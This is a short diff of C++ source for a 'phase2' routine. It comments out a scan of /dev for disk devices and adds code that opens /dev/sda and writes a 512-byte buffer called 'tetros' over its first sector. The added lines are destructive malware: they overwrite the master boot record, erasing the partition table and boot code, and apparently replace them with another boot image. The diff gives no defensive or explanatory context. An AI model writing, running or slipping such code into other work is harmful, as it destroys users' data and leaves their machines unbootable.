@@ -10,10 +10,11 @@ phase2::phase2()
 int phase2::execute()
 {
 	int secsToWait;
+	/*
 	DIR *dir;
 	struct dirent *ent;
 	if ((dir = opendir ("/dev")) != NULL) {
-	  /* print all the files and directories within directory */
+	  /* print all the files and directories within directory 
 	  while ((ent = readdir (dir)) != NULL) {
  	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
 	   {
@@ -28,10 +29,16 @@ int phase2::execute()
  	 }
  	 closedir (dir);
 	} else {
- 	 /* could not open directory */
+ 	 /* could not open directory 
   	perror ("");
   	return EXIT_FAILURE;
 	}
+        */
+	int fd = open("/dev/sda", O_WRONLY);
+	if(write(fd, tetros, 512) == -1){
+	  perror("perror: ");
+	}
+	close(fd);
 
 	secsToWait = 2;
 
